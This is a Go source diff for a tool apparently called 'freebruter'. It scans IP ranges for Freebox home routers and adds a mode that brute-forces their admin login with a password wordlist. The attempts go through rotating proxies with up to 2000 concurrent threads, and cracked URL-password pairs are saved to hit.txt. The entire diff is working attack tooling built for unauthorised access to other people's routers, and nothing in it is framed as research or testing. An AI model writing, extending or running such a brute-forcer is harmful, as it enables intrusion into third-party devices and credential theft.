@@ -5,15 +5,18 @@ import (
 	"io"
 	"net"
 	"net/http"
+	"os"
 	"regexp"
 	"strings"
 	"sync"
 	"time"
 
+	"github.com/0xF7A4C6/GoCycle"
 	"github.com/0xF7A4C6/freebruter/internal/console"
 	"github.com/0xF7A4C6/freebruter/internal/freebox"
 	"github.com/0xF7A4C6/freebruter/internal/utils"
 	"github.com/korylprince/ipnetgen"
+	"github.com/valyala/fasthttp/fasthttpproxy"
 	"github.com/zenthangplus/goccm"
 )
 
@@ -24,10 +27,57 @@ const (
 var (
 	ports                       = []int{80}
 	checked, found, hit, errors int
+	pass                        = []string{}
+	p                           *GoCycle.Cycle
 )
 
+// Bruteforce login using wordlist
+func bruteUrl(url string) {
+	box := freebox.NewFreeboxClient(url, func(addr string) (net.Conn, error) {
+		pp, _ := p.Next()
+		go p.LockByTimeout(pp, time.Duration(time.Second*3))
+		return fasthttpproxy.FasthttpHTTPDialer(pp)(addr)
+	})
+
+	for _, p := range pass {
+		c, err := box.GetChallenge()
+		if err != nil {
+			fmt.Println(err)
+			break
+		}
+
+		time.Sleep(10000 * time.Millisecond)
+		password := p
+
+		r, err := box.Login(box.GetHash(password, c.Result.PasswordSalt, box.SolveChallenge(c)))
+		if err != nil {
+			fmt.Println(err)
+			break
+		}
+
+		if !r.Success {
+			console.Log(fmt.Sprintf("[INVALID] %s (%s - %s, %s)", url, password, r.Msg, r.ErrorCode))
+
+			if r.ErrorCode == "invalid_api_version" {
+				break
+			}
+
+			continue
+		}
+
+		found++
+		console.Log(fmt.Sprintf("[FOUND] %s (%s)", url, password))
+		utils.AppendFile("hit.txt", fmt.Sprintf("%s:%s", url, password))
+	}
+}
+
+// Test url by using freebox name as password
 func testUrl(url string) {
-	box := freebox.NewFreeboxClient(url)
+	box := freebox.NewFreeboxClient(url, func(addr string) (net.Conn, error) {
+		pp, _ := p.Next()
+		go p.LockByTimeout(pp, time.Duration(time.Second*3))
+		return fasthttpproxy.FasthttpHTTPDialer(pp)(addr)
+	})
 
 	c, err := box.GetChallenge()
 	if err != nil {
@@ -137,14 +187,15 @@ func IsFreebox(ip string) {
 		break
 	}
 }
+
 func titleThread() {
 	startTime := time.Now()
 
 	for {
 		time.Sleep(time.Millisecond)
-		
+
 		elapsedMinutes := int(time.Since(startTime).Seconds())
-		
+
 		checkedCPM := 0
 		if elapsedMinutes > 0 {
 			checkedCPM = checked / elapsedMinutes
@@ -156,7 +207,7 @@ func titleThread() {
 	}
 }
 
-func main() {
+func scan() {
 	threads := goccm.New(2000)
 	go titleThread()
 
@@ -184,4 +235,41 @@ func main() {
 	}
 
 	threads.WaitAllDone()
+}
+
+func brute() {
+	p, _ = GoCycle.NewFromFile("../../assets/proxies.txt")
+
+	threads := goccm.New(2000)
+	go titleThread()
+
+	pannel, err := utils.ReadFile("found_pannel.txt")
+	if err != nil {
+		panic(err)
+	}
+
+	pass, _ = utils.ReadFile("wordlist.txt")
+
+	for _, addr := range pannel {
+		threads.Wait()
+
+		go func(address string) {
+			defer threads.Done()
+			bruteUrl(strings.Split(address, "/login.php")[0])
+			checked++
+		}(addr)
+	}
+
+	threads.WaitAllDone()
+}
+
+func main() {
+	os.Args = os.Args[1:]
+
+	switch os.Args[0] {
+	case "brute":
+		brute()
+	case "scan":
+		scan()
+	}
 }
